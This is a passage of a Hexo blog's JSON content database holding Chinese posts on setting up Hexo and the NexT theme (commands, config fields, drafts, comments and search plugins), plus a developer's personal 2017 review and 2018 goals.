找到资源的地方</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li><strong>拓展</strong></li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th style=\"text-align:center\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>theme</td>\n<td style=\"text-align:center\">启用主题名称，与 theme 里的名字要一样，这里是 meterial，默认是 landscape</td>\n</tr>\n<tr>\n<td>deploy</td>\n<td style=\"text-align:center\">部署到 GitHub 的<code>type: git,repo: https://github.com/yokiyokiyoki/blog.git,branch: master</code></td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h4 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h4><ul>\n<li><code>hexo new ..</code>写新的日志</li>\n<li><code>hexo g</code>生成静态文件,不简写的话是<code>hexo generate</code></li>\n<li><code>hexo d</code>部署到<code>github</code>，不简写的话是<code>hexo deploy</code>（可以先删除 deploy_git 文件）</li>\n<li><code>hexo s</code>本地启动服务预览，不简写的话是<code>hexo server</code></li>\n<li><code>hexo clean</code>清除缓存文件 (db.json) 和已生成的静态文件 (public)。在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，可能需要运行该命令。</li>\n<li><code>hexo version</code>显示<code>Hexo</code>的版本</li>\n</ul>\n<hr>\n<h2 id=\"主题\"><a href=\"#主题\" class=\"headerlink\" title=\"主题\"></a>主题</h2><blockquote>\n<p>采用了 next 主题，<a href=\"https://github.com/iissnan/hexo-theme-next\" target=\"_blank\" rel=\"noopener\">GitHub</a>和<a href=\"http://theme-next.iissnan.com/\" target=\"_blank\" rel=\"noopener\">官网</a></p>\n</blockquote>\n<ul>\n<li>安装「Next」<ul>\n<li>在<code>theme</code>文件夹下面采用<code>git clone</code>下载，缺点是很慢，优点是方便更新</li>\n<li>更新：直接拉取远程分支更新。</li>\n<li>在<code>theme</code>文件夹下，然后改名为 <strong>next</strong></li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2 id=\"分支发布策略\"><a href=\"#分支发布策略\" class=\"headerlink\" title=\"分支发布策略\"></a>分支发布策略</h2><ul>\n<li>直接在 hexo 开发，master 不用管</li>\n<li>第一次先下载好 next 主题，不然会生成空的 html</li>\n<li>可以先删除<code>.deploy_git</code>文件</li>\n<li>hexo 分支用来保存源代码和编辑文章，每次编辑完文章首先应该推送 hexo 分支到远端，先<code>hexo clean</code>然后执行<code>hexo g</code>最后<code>hexo d</code>,就会自动部署。</li>\n<li>master 分支用来部署静态页面。</li>\n</ul>\n<h2 id=\"私密文章\"><a href=\"#私密文章\" class=\"headerlink\" title=\"私密文章\"></a>私密文章</h2><blockquote>\n<p>草稿其实就是相当于很多博客都有的<code>私密文章</code>功能</p>\n</blockquote>\n<ul>\n<li><code>hexo new draft &quot;draftName&quot;</code>会在 source/_drafts 目录下生成一个文件，但是这个文件不被显示在页面上，链接也访问不到。也就是说如果你想把某一篇文章移除显示，又不舍得删除，可以把它移动到_drafts 目录之中。</li>\n<li>如果希望强行预览草稿，更改配置文件。<code>reder_drafts:true</code>。或者<code>hexo server --drafts</code>启动命令行</li>\n<li>也可以发布草稿，<code>hexo publish [layout] &lt;title&gt;</code>,<code>layout</code> 来指定布局</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"基于-Hexo-的博客\"><a href=\"#基于-Hexo-的博客\" class=\"headerlink\" title=\"基于 Hexo 的博客\"></a>基于 Hexo 的博客</h1><blockquote>\n<p>我的第一个页面哎~</p>\n</blockquote>\n<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><blockquote>\n<p>Hexo 的<a href=\"https://github.com/hexojs\" target=\"_blank\" rel=\"noopener\">Github</a>和<a href=\"https://hexo.io/zh-cn/\" target=\"_blank\" rel=\"noopener\">中文官网</a></p>\n</blockquote>\n<h4 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h4><ul>\n<li>Node 和 Git 必须要有</li>\n<li><code>npm install -g hexo-cli</code>下载 hexo 的脚手架,可以全局使用 hexo 命令</li>\n</ul>\n<hr>\n<h4 id=\"建站\"><a href=\"#建站\" class=\"headerlink\" title=\"建站\"></a>建站</h4><ul>\n<li><code>hexo init &lt;folder&gt;</code>初始化文件夹，如果不写 folder，那么则在当前目录初始化，如果写了 folder 则在当前目录创建这个 folder，并在 folder 里面初始化</li>\n<li><code>npm install</code>下载依赖</li>\n</ul>\n<hr>\n<h4 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h4><blockquote>\n<p>网站分别有两个配置文件。一个是 <em>站点配置文件</em> 即根目录下的<em>config.yml,一个是 </em>主题配置文件_ 即 themes 文件夹内的_config.yml</p>\n</blockquote>\n<ol>\n<li><strong>网站</strong></li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th style=\"text-align:center\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>title</td>\n<td style=\"text-align:center\">网站名称</td>\n</tr>\n<tr>\n<td>subtitle</td>\n<td style=\"text-align:center\">网站副标题</td>\n</tr>\n<tr>\n<td>description</td>\n<td style=\"text-align:center\">网站描述（用于 SEO，告诉搜索引擎一个关于您站点的简单描述，通常可以写关键词）</td>\n</tr>\n<tr>\n<td>author</td>\n<td style=\"text-align:center\">本作者啦~</td>\n</tr>\n<tr>\n<td>language</td>\n<td style=\"text-align:center\">网站语言，这里是 zh-CN</td>\n</tr>\n<tr>\n<td>timezone</td>\n<td style=\"text-align:center\">网站时区，默认是电脑的时区</td>\n</tr>\n<tr>\n<td>url</td>\n<td style=\"text-align:center\">这里是<a href=\"https://yokiyokiyoki.github.io/blog/\">https://yokiyokiyoki.github.io/blog/</a></td>\n</tr>\n<tr>\n<td>root</td>\n<td style=\"text-align:center\">根目录是/blog/，这里是 css 和 js 找到资源的地方</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li><strong>拓展</strong></li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th style=\"text-align:center\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>theme</td>\n<td style=\"text-align:center\">启用主题名称，与 theme 里的名字要一样，这里是 meterial，默认是 landscape</td>\n</tr>\n<tr>\n<td>deploy</td>\n<td style=\"text-align:center\">部署到 GitHub 的<code>type: git,repo: https://github.com/yokiyokiyoki/blog.git,branch: master</code></td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h4 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h4><ul>\n<li><code>hexo new ..</code>写新的日志</li>\n<li><code>hexo g</code>生成静态文件,不简写的话是<code>hexo generate</code></li>\n<li><code>hexo d</code>部署到<code>github</code>，不简写的话是<code>hexo deploy</code>（可以先删除 deploy_git 文件）</li>\n<li><code>hexo s</code>本地启动服务预览，不简写的话是<code>hexo server</code></li>\n<li><code>hexo clean</code>清除缓存文件 (db.json) 和已生成的静态文件 (public)。在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，可能需要运行该命令。</li>\n<li><code>hexo version</code>显示<code>Hexo</code>的版本</li>\n</ul>\n<hr>\n<h2 id=\"主题\"><a href=\"#主题\" class=\"headerlink\" title=\"主题\"></a>主题</h2><blockquote>\n<p>采用了 next 主题，<a href=\"https://github.com/iissnan/hexo-theme-next\" target=\"_blank\" rel=\"noopener\">GitHub</a>和<a href=\"http://theme-next.iissnan.com/\" target=\"_blank\" rel=\"noopener\">官网</a></p>\n</blockquote>\n<ul>\n<li>安装「Next」<ul>\n<li>在<code>theme</code>文件夹下面采用<code>git clone</code>下载，缺点是很慢，优点是方便更新</li>\n<li>更新：直接拉取远程分支更新。</li>\n<li>在<code>theme</code>文件夹下，然后改名为 <strong>next</strong></li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2 id=\"分支发布策略\"><a href=\"#分支发布策略\" class=\"headerlink\" title=\"分支发布策略\"></a>分支发布策略</h2><ul>\n<li>直接在 hexo 开发，master 不用管</li>\n<li>第一次先下载好 next 主题，不然会生成空的 html</li>\n<li>可以先删除<code>.deploy_git</code>文件</li>\n<li>hexo 分支用来保存源代码和编辑文章，每次编辑完文章首先应该推送 hexo 分支到远端，先<code>hexo clean</code>然后执行<code>hexo g</code>最后<code>hexo d</code>,就会自动部署。</li>\n<li>master 分支用来部署静态页面。</li>\n</ul>\n<h2 id=\"私密文章\"><a href=\"#私密文章\" class=\"headerlink\" title=\"私密文章\"></a>私密文章</h2><blockquote>\n<p>草稿其实就是相当于很多博客都有的<code>私密文章</code>功能</p>\n</blockquote>\n<ul>\n<li><code>hexo new draft &quot;draftName&quot;</code>会在 source/_drafts 目录下生成一个文件，但是这个文件不被显示在页面上，链接也访问不到。也就是说如果你想把某一篇文章移除显示，又不舍得删除，可以把它移动到_drafts 目录之中。</li>\n<li>如果希望强行预览草稿，更改配置文件。<code>reder_drafts:true</code>。或者<code>hexo server --drafts</code>启动命令行</li>\n<li>也可以发布草稿，<code>hexo publish [layout] &lt;title&gt;</code>,<code>layout</code> 来指定布局</li>\n</ul>\n"},{"title":"next主题使用","date":"2017-03-08T06:37:41.000Z","comments":0,"_content":"# 初步使用\n\n## 选择Scheme\n> 目前支持三种Scheme\n\n- Muse:默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白\n- Mist:Muse 的紧凑版本，整洁有序的单栏外观\n- Pisces:双栏 Scheme，小家碧玉似的清新\n\nScheme 的切换通过更改 主题配置文件，搜索 scheme 关键字。 你会看到有三行 scheme 的配置，将你需用启用的 scheme 前面注释 # 即可。\n\n这里我使用了Pisces，哈哈小家碧玉我喜欢这个词\n\n## 选择语言\n- 在`站点配置文件`里面有language，目前next支持的简体中文是zh-Hans\n\n## 开启标签页面\n- `hexo new page tags`新建一个页面tags，然后它会在source下面生成一个tags，里面会有index.md\n- 找到上面说的index.md添加`type: \"tags\"`\n\n## 第三方服务\n\n#### 评论\n- 使用了多说评论，首先登录[多说](http://duoshuo.com/)\n- 登录了多说之后选择“我要安装”\n- 创建站点，填写站点相关信息，这里就是我的blog，多说域名一栏写的就是`duoshuo_shortname`，我的是blog419703726\n- 在主题配置文件搜索`duoshuo_shortname`写上blog419703726\n\n#### 分享\n- 采用了多说分享\n- 在主题配置文件里改`duoshuo_share: true`\n\n#### 数据统计与分析\n- 选择了[腾讯分析](http://v2.ta.qq.com/summary/index)，登录并填写域名\n- 在主题配置文件里将ID放置在`tencent_analytics` 字段\n\n#### 站内搜索\n- 安装hexo-generator-searchdb --save\n- 编辑站点配置文件，添加以下内容\n```bash\n search:\n  path: search.xml\n  field: post\n  format: html\n  limit: 10000\n```\n-编辑主题配置文件,enable改为true\n```bash\nlocal_search:\n  enable: true\n```\n\n#### 头像\n- 在站点配置文件夹下面新建一个avtar关键词，`avatar: /images/avatar.jpg`这里映射到的目录是themes下的next的source的images \n\n#### 阅读量添加\n- 参见这篇[文章](https://notes.wanghao.work/2015-10-21-%E4%B8%BANexT%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD.html#%E9%85%8D%E7%BD%AELeanCloud)\n\n\n\n","source":"_drafts/use-next.md","raw":"---\ntitle: next主题使用\ndate: 2017-03-08 14:37:41\ntags: \"Hexo\"\ncomments: false\n---\n# 初步使用\n\n## 选择Scheme\n> 目前支持三种Scheme\n\n- Muse:默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白\n- Mist:Muse 的紧凑版本，整洁有序的单栏外观\n- Pisces:双栏 Scheme，小家碧玉似的清新\n\nScheme 的切换通过更改 主题配置文件，搜索 scheme 关键字。 你会看到有三行 scheme 的配置，将你需用启用的 scheme 前面注释 # 即可。\n\n这里我使用了Pisces，哈哈小家碧玉我喜欢这个词\n\n## 选择语言\n- 在`站点配置文件`里面有language，目前next支持的简体中文是zh-Hans\n\n## 开启标签页面\n- `hexo new page tags`新建一个页面tags，然后它会在source下面生成一个tags，里面会有index.md\n- 找到上面说的index.md添加`type: \"tags\"`\n\n## 第三方服务\n\n#### 评论\n- 使用了多说评论，首先登录[多说](http://duoshuo.com/)\n- 登录了多说之后选择“我要安装”\n- 创建站点，填写站点相关信息，这里就是我的blog，多说域名一栏写的就是`duoshuo_shortname`，我的是blog419703726\n- 在主题配置文件搜索`duoshuo_shortname`写上blog419703726\n\n#### 分享\n- 采用了多说分享\n- 在主题配置文件里改`duoshuo_share: true`\n\n#### 数据统计与分析\n- 选择了[腾讯分析](http://v2.ta.qq.com/summary/index)，登录并填写域名\n- 在主题配置文件里将ID放置在`tencent_analytics` 字段\n\n#### 站内搜索\n- 安装hexo-generator-searchdb --save\n- 编辑站点配置文件，添加以下内容\n```bash\n search:\n  path: search.xml\n  field: post\n  format: html\n  limit: 10000\n```\n-编辑主题配置文件,enable改为true\n```bash\nlocal_search:\n  enable: true\n```\n\n#### 头像\n- 在站点配置文件夹下面新建一个avtar关键词，`avatar: /images/avatar.jpg`这里映射到的目录是themes下的next的source的images \n\n#### 阅读量添加\n- 参见这篇[文章](https://notes.wanghao.work/2015-10-21-%E4%B8%BANexT%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD.html#%E9%85%8D%E7%BD%AELeanCloud)\n\n\n\n","slug":"use-next","published":0,"updated":"2018-02-26T02:53:49.777Z","layout":"post","photos":[],"link":"","_id":"cjsm034j900020iof3gsyd9h7","content":"<h1 id=\"初步使用\"><a href=\"#初步使用\" class=\"headerlink\" title=\"初步使用\"></a>初步使用</h1><h2 id=\"选择Scheme\"><a href=\"#选择Scheme\" class=\"headerlink\" title=\"选择Scheme\"></a>选择Scheme</h2><blockquote>\n<p>目前支持三种Scheme</p>\n</blockquote>\n<ul>\n<li>Muse:默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li>\n<li>Mist:Muse 的紧凑版本，整洁有序的单栏外观</li>\n<li>Pisces:双栏 Scheme，小家碧玉似的清新</li>\n</ul>\n<p>Scheme 的切换通过更改 主题配置文件，搜索 scheme 关键字。 你会看到有三行 scheme 的配置，将你需用启用的 scheme 前面注释 # 即可。</p>\n<p>这里我使用了Pisces，哈哈小家碧玉我喜欢这个词</p>\n<h2 id=\"选择语言\"><a href=\"#选择语言\" class=\"headerlink\" title=\"选择语言\"></a>选择语言</h2><ul>\n<li>在<code>站点配置文件</code>里面有language，目前next支持的简体中文是zh-Hans</li>\n</ul>\n<h2 id=\"开启标签页面\"><a href=\"#开启标签页面\" class=\"headerlink\" title=\"开启标签页面\"></a>开启标签页面</h2><ul>\n<li><code>hexo new page tags</code>新建一个页面tags，然后它会在source下面生成一个tags，里面会有index.md</li>\n<li>找到上面说的index.md添加<code>type: &quot;tags&quot;</code></li>\n</ul>\n<h2 id=\"第三方服务\"><a href=\"#第三方服务\" class=\"headerlink\" title=\"第三方服务\"></a>第三方服务</h2><h4 id=\"评论\"><a href=\"#评论\" class=\"headerlink\" title=\"评论\"></a>评论</h4><ul>\n<li>使用了多说评论，首先登录<a href=\"http://duoshuo.com/\" target=\"_blank\" rel=\"noopener\">多说</a></li>\n<li>登录了多说之后选择“我要安装”</li>\n<li>创建站点，填写站点相关信息，这里就是我的blog，多说域名一栏写的就是<code>duoshuo_shortname</code>，我的是blog419703726</li>\n<li>在主题配置文件搜索<code>duoshuo_shortname</code>写上blog419703726</li>\n</ul>\n<h4 id=\"分享\"><a href=\"#分享\" class=\"headerlink\" title=\"分享\"></a>分享</h4><ul>\n<li>采用了多说分享</li>\n<li>在主题配置文件里改<code>duoshuo_share: true</code></li>\n</ul>\n<h4 id=\"数据统计与分析\"><a href=\"#数据统计与分析\" class=\"headerlink\" title=\"数据统计与分析\"></a>数据统计与分析</h4><ul>\n<li>选择了<a href=\"http://v2.ta.qq.com/summary/index\" target=\"_blank\" rel=\"noopener\">腾讯分析</a>，登录并填写域名</li>\n<li>在主题配置文件里将ID放置在<code>tencent_analytics</code> 字段</li>\n</ul>\n<h4 id=\"站内搜索\"><a href=\"#站内搜索\" class=\"headerlink\" title=\"站内搜索\"></a>站内搜索</h4><ul>\n<li>安装hexo-generator-searchdb –save</li>\n<li>编辑站点配置文件，添加以下内容<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\"> path: search.xml</span><br><span class=\"line\"> field: post</span><br><span class=\"line\"> format: html</span><br><span class=\"line\"> <span class=\"built_in\">limit</span>: 10000</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>-编辑主题配置文件,enable改为true<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local_search:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"头像\"><a href=\"#头像\" class=\"headerlink\" title=\"头像\"></a>头像</h4><ul>\n<li>在站点配置文件夹下面新建一个avtar关键词，<code>avatar: /images/avatar.jpg</code>这里映射到的目录是themes下的next的source的images </li>\n</ul>\n<h4 id=\"阅读量添加\"><a href=\"#阅读量添加\" class=\"headerlink\" title=\"阅读量添加\"></a>阅读量添加</h4><ul>\n<li>参见这篇<a href=\"https://notes.wanghao.work/2015-10-21-%E4%B8%BANexT%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD.html#%E9%85%8D%E7%BD%AELeanCloud\" target=\"_blank\" rel=\"noopener\">文章</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"初步使用\"><a href=\"#初步使用\" class=\"headerlink\" title=\"初步使用\"></a>初步使用</h1><h2 id=\"选择Scheme\"><a href=\"#选择Scheme\" class=\"headerlink\" title=\"选择Scheme\"></a>选择Scheme</h2><blockquote>\n<p>目前支持三种Scheme</p>\n</blockquote>\n<ul>\n<li>Muse:默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li>\n<li>Mist:Muse 的紧凑版本，整洁有序的单栏外观</li>\n<li>Pisces:双栏 Scheme，小家碧玉似的清新</li>\n</ul>\n<p>Scheme 的切换通过更改 主题配置文件，搜索 scheme 关键字。 你会看到有三行 scheme 的配置，将你需用启用的 scheme 前面注释 # 即可。</p>\n<p>这里我使用了Pisces，哈哈小家碧玉我喜欢这个词</p>\n<h2 id=\"选择语言\"><a href=\"#选择语言\" class=\"headerlink\" title=\"选择语言\"></a>选择语言</h2><ul>\n<li>在<code>站点配置文件</code>里面有language，目前next支持的简体中文是zh-Hans</li>\n</ul>\n<h2 id=\"开启标签页面\"><a href=\"#开启标签页面\" class=\"headerlink\" title=\"开启标签页面\"></a>开启标签页面</h2><ul>\n<li><code>hexo new page tags</code>新建一个页面tags，然后它会在source下面生成一个tags，里面会有index.md</li>\n<li>找到上面说的index.md添加<code>type: &quot;tags&quot;</code></li>\n</ul>\n<h2 id=\"第三方服务\"><a href=\"#第三方服务\" class=\"headerlink\" title=\"第三方服务\"></a>第三方服务</h2><h4 id=\"评论\"><a href=\"#评论\" class=\"headerlink\" title=\"评论\"></a>评论</h4><ul>\n<li>使用了多说评论，首先登录<a href=\"http://duoshuo.com/\" target=\"_blank\" rel=\"noopener\">多说</a></li>\n<li>登录了多说之后选择“我要安装”</li>\n<li>创建站点，填写站点相关信息，这里就是我的blog，多说域名一栏写的就是<code>duoshuo_shortname</code>，我的是blog419703726</li>\n<li>在主题配置文件搜索<code>duoshuo_shortname</code>写上blog419703726</li>\n</ul>\n<h4 id=\"分享\"><a href=\"#分享\" class=\"headerlink\" title=\"分享\"></a>分享</h4><ul>\n<li>采用了多说分享</li>\n<li>在主题配置文件里改<code>duoshuo_share: true</code></li>\n</ul>\n<h4 id=\"数据统计与分析\"><a href=\"#数据统计与分析\" class=\"headerlink\" title=\"数据统计与分析\"></a>数据统计与分析</h4><ul>\n<li>选择了<a href=\"http://v2.ta.qq.com/summary/index\" target=\"_blank\" rel=\"noopener\">腾讯分析</a>，登录并填写域名</li>\n<li>在主题配置文件里将ID放置在<code>tencent_analytics</code> 字段</li>\n</ul>\n<h4 id=\"站内搜索\"><a href=\"#站内搜索\" class=\"headerlink\" title=\"站内搜索\"></a>站内搜索</h4><ul>\n<li>安装hexo-generator-searchdb –save</li>\n<li>编辑站点配置文件，添加以下内容<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\"> path: search.xml</span><br><span class=\"line\"> field: post</span><br><span class=\"line\"> format: html</span><br><span class=\"line\"> <span class=\"built_in\">limit</span>: 10000</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>-编辑主题配置文件,enable改为true<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local_search:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"头像\"><a href=\"#头像\" class=\"headerlink\" title=\"头像\"></a>头像</h4><ul>\n<li>在站点配置文件夹下面新建一个avtar关键词，<code>avatar: /images/avatar.jpg</code>这里映射到的目录是themes下的next的source的images </li>\n</ul>\n<h4 id=\"阅读量添加\"><a href=\"#阅读量添加\" class=\"headerlink\" title=\"阅读量添加\"></a>阅读量添加</h4><ul>\n<li>参见这篇<a href=\"https://notes.wanghao.work/2015-10-21-%E4%B8%BANexT%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD.html#%E9%85%8D%E7%BD%AELeanCloud\" target=\"_blank\" rel=\"noopener\">文章</a></li>\n</ul>\n"},{"title":"2017展望与2018总结","date":"2018-02-25T15:12:22.000Z","_content":"\n#### 2017 总结\n\n> 工作上\n\n* 官网方面：17 年 1 月进入到公司，当时正值官网重构，组长为了锻炼我，便让我参与到了官网的重构当中。\n* 产品方面：官网完成之后，雷达刚好升级 2.0，我去负责其中两个模块的迁移。之后一直负责雷达的开发，维护过立方，聚合，接触了很多公司的产品。\n* 项目方面：期间维护 MIG 系统，并且重构了整个 DBA，能更快地迁移类似的模块。后来参与研发 ipsos 雷达。\n\n> 学习上\n\n* 关于 vue：这一年，也算写了大量的 vue 代码，但 vue 封装了大量的 js 代码，屏蔽底层实现细节，所以我很清楚会写 vue 并不算什么，在前端框架日新月异的今天，只有深入地了解并掌握其中原理，才能以不变应万变。\n* 关于可视化方向：由于 echarts 底层封装实在是过于复杂，也没有仔细去研究，只能去应用它的 api，这是我所遗憾的地方。\n* 关于构建工具：先是接触了 gulp，但并不是了解得很清楚。而对于 webpack 这一块，配置得也算还可以，也大概知晓构建工具在前端方面的应用，但是我觉得不要满足于只做一个配置工程师，知道思想最为重要，要知道为什么会有压缩代码，合并请求等操作。\n* 关于读书：喜欢看人物传记，比如爱因斯坦。物理学和哲学上有趣的书也看了不少,极大的开阔了我的眼界。关于 JavaScript 的书，把《你不知道的 JavaScript》也翻了一遍，对于算法（图解算法）也大概翻了一下。\n* 关于印象笔记：只是自己选择的一种记录的工具，因为之前请教别人的时候发现，别人说了一遍方法，但是会很快忘记，所以这时候最好把它记录下来。笔记里记录了今年工作上遇到的问题，方便自己快速复查。\n\n> 总结\n\n* 总的来说，这一年，觉得自己是\"开眼看世界\"的一年，知道自己是热爱前端的，也知道一个好的前端工程师，他首先得是一个工程师，势必要了解算法，http 等基础知识。而纵向学习是提升学习深度的结果，而不是追求学习广度的结果。\n\n#### 2018 展望\n\n> 工作上\n\n* 前端系统搭建:yoda 系统搭建。\n* 后端：学习一下 java，希望能接触组内一些后端的项目，简单写些接口。\n* 业务组件库：业务上建立一个属于自己乃至于公司的组件库，因为做产品发现，一个好用的业务组件能提升很多开发效率。\n* 数据分析：由于我们团队比较偏向分析，可以多向分析师取经。眼光应该放宽一点，学习数据方面的分析，才能对公司的产品和项目有更好的感知度。\n\n> 学习上\n\n* MVVM 框架：希望能熟练使用 react 和 angular，最终目标希望能自己造一个小巧的 mvvm 框架，当然造轮子的意义是为了自己学习。\n* Node 开发：能编写一个 express 或者 koa 的中间件。熟练掌握 CRUD 应用。\n* 构建工具：梳理前端构建工具，把常用的大概研究一遍。\n* Typescript：学习 typescript，相信强类型一定会在将来被纳入 ECMAScript 的标准。\n* 关于笔记：希望能把每天要做的事，坚持写在 oneNote，养成良好习惯。而工作上要记下来的写在印象笔记。\n* Java：能熟练进行 web 开发。\n* 关于可视化方向：学习 d3.js 和 three.js。\n* 关于读书：坚持读书，温故知新更为重要。\n* 关于英语：英语实在是太重要了，需要加强学习。\n\n> 生活习惯\n\n* 保持精力充沛的前提是要有足够的锻炼，如果每天实在是没有忙到要加班的情况，可以九点走，放好书包后出来跑半小时的步。\n* 坚持八点起床，注意自己的仪容仪表。\n\n> 总结\n\n* 多增加了一个维度，同时希望自己能真正对得起工程师这个 title。\n","source":"_posts/2018.md","raw":"---\ntitle: 2017展望与2018总结\ndate: 2018-02-25 23:12:22\ntags: 生活随想\n---\n\n#### 2017 总结\n\n> 工作上\n\n* 官网方面：17 年 1 月进入到公司，当时正值官网重构，组长为了锻炼我，便让我参与到了官网的重构当中。\n* 产品方面：官网完成之后，雷达刚好升级 2.0，我去负责其中两个模块的迁移。之后一直负责雷达的开发，维护过立方，聚合，接触了很多公司的产品。\n* 项目方面：期间维护 MIG 系统，并且重构了整个 DBA，能更快地迁移类似的模块。后来参与研发 ipsos 雷达。\n\n> 学习上\n\n* 关于 vue：这一年，也算写了大量的 vue 代码，但 vue 封装了大量的 js 代码，屏蔽底层实现细节，所以我很清楚会写 vue 并不算什么，在前端框架日新月异的今天，只有深入地了解并掌握其中原理，才能以不变应万变。\n* 关于可视化方向：由于 echarts 底层封装实在是过于复杂，也没有仔细去研究，只能去应用它的 api，这是我所遗憾的地方。\n* 关于构建工具：先是接触了 gulp，但并不是了解得很清楚。而对于 webpack 这一块，配置得也算还可以，也大概知晓构建工具在前端方面的应用，但是我觉得不要满足于只做一个配置工程师，知道思想最为重要，要知道为什么会有压缩代码，合并请求等操作。\n* 关于读书：喜欢看人物传记，比如爱因斯坦。物理学和哲学上有趣的书也看了不少,极大的开阔了我的眼界。关于 JavaScript 的书，把《你不知道的 JavaScript》也翻了一遍，对于算法（图解算法）也大概翻了一下。\n* 关于印象笔记：只是自己选择的一种记录的工具，因为之前请教别人的时候发现，别人说了一遍方法，但是会很快忘记，所以这时候最好把它记录下来。笔记里记录了今年工作上遇到的问题，方便自己快速复查。\n\n> 总结\n\n* 总的来说，这一年，觉得自己是\"开眼看世界\"的一年，知道自己是热爱前端的，也知道一个好的前端工程师，他首先得是一个工程师，势必要了解算法，http 等基础知识。而纵向学习是提升学习深度的结果，而不是追求学习广度的结果。\n\n#### 2018 展望\n\n> 工作上\n\n* 前端系统搭建:yoda 系统搭建。\n* 后端：学习一下 java，希望能接触组内一些后端的项目，简单写些接口。\n* 业务组件库：业务上建立一个属于自己乃至于公司的组件库，因为做产品发现，一个好用的业务组件能提升很多开发效率。\n* 数据分析：由于我们团队比较偏向分析，可以多向分析师取经。眼光应该放宽一点，学习数据方面的分析，才能对公司的产品和项目有更好的感知度。\n\n> 学习上\n\n* MVVM 框架：希望能熟练使用 react 和 angular，最终目标希望能自己造一个小巧的 mvvm 框架，当然造轮子的意义是为了自己学习。\n* Node 开发：能编写一个 express 或者 koa 的中间件。熟练掌握 CRUD 应用。\n* 构建工具：梳理前端构建工具，把常用的大概研究一遍。\n* Typescript：学习 typescript，相信强类型一定会在将来被纳入 ECMAScript 的标准。\n* 关于笔记：希望能把每天要做的事，坚持写在 oneNote，养成良好习惯。而工作上要记下来的写在印象笔记。\n* Java：能熟练进行 web 开发。\n* 关于可视化方向：学习 d3.js 和 three.js。\n* 关于读书：坚持读书，温故知新更为重要。\n* 关于英语：英语实在是太重要了，需要加强学习。\n\n> 生活习惯\n\n* 保持精力充沛的前提是要有足够的锻炼，如果每天实在是没有忙到要加班的情况，可以九点走，放好书包后出来跑半小时的步。\n* 坚持八点起床，注意自己的仪容仪表。\n\n> 总结\n\n* 多增加了一个维度，同时希望自己能真正对得起工程师这个 title。\n","slug":"2018","published":1,"updated":"2018-04-10T02:26:08.982Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jh00050iofjdrkp34y","content":"<h4 id=\"2017-总结\"><a href=\"#2017-总结\" class=\"headerlink\" title=\"2017 总结\"></a>2017 总结</h4><blockquote>\n<p>工作上</p>\n</blockquote>\n<ul>\n<li>官网方面：17 年 1 月进入到公司，当时正值官网重构，组长为了锻炼我，便让我参与到了官网的重构当中。</li>\n<li>产品方面：官网完成之后，雷达刚好升级 2.0，我去负责其中两个模块的迁移。之后一直负责雷达的开发，维护过立方，聚合，接触了很多公司的产品。</li>\n<li>项目方面：期间维护 MIG 系统，并且重构了整个 